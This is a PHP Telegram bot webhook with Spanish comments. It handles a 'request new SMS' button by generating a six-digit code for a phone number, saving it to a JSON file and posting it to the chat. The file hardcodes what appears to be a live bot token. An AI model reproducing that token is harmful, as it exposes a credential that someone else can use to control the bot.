<?php
// Webhook de Telegram para manejar el botón "Pedir nuevo SMS"

// Mismos valores que en procesar.php
$BOT_TOKEN = '8036763317:AAGJbdfFqJt3yi_MwhnP1_DXsSug9oW31HY';

function rutaCodigos()
{
    return __DIR__ . '/codigos.json';
}

function guardarCodigo($telefono, $codigo)
{
    $archivo = rutaCodigos();
    $datos = [];
    if (is_file($archivo)) {
        $json = file_get_contents($archivo);
        $tmp = json_decode($json, true);
        if (is_array($tmp)) {
            $datos = $tmp;
        }
    }
    $datos[$telefono] = $codigo;
    file_put_contents($archivo, json_encode($datos));
}

function enviarATelegram($botToken, $chatId, $texto)
{
    if ($botToken === 'PON_AQUI_TU_BOT_TOKEN') {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text'    => $texto,
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5,
        ],
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    http_response_code(400);
    exit('No update');
}

// Solo nos interesan las callback_query del botón inline
if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $chatId   = $callback['message']['chat']['id'] ?? null;
    $data     = $callback['data'] ?? '';

    if ($chatId && strpos($data, 'PEDIR_SMS|') === 0) {
        $telefono = substr($data, strlen('PEDIR_SMS|'));
        $telefono = trim($telefono);

        if ($telefono !== '') {
            // Generar nuevo código y guardarlo para ese teléfono
            $nuevoCodigo = random_int(100000, 999999);
            guardarCodigo($telefono, $nuevoCodigo);

            // Aquí integrarías el envío real de SMS usando $telefono y $nuevoCodigo

            $texto = "Nuevo código SMS generado para $telefono: $nuevoCodigo";
            enviarATelegram($BOT_TOKEN, $chatId, $texto);
        }
    }
}

// Telegram solo necesita un 200 OK
http_response_code(200);
echo 'OK';
